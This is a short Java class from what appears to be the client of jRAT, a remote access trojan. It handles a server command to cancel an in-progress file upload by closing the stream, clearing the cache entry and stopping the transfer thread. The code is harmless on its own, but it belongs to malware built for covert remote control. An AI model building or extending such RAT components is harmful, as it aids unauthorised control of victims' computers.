package jrat.client.packets.incoming;

import io.jrat.common.io.FileCache;
import io.jrat.common.io.TransferData;
import jrat.client.Connection;

public class Packet105CancelClientUpload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String remotePath = con.readLine();

		TransferData localData = FileCache.get(remotePath);
		
		if (localData != null) {
			localData.getOutputStream().close();
			FileCache.remove(localData);
			localData.getRunnable().interrupt();
		}
	}

}
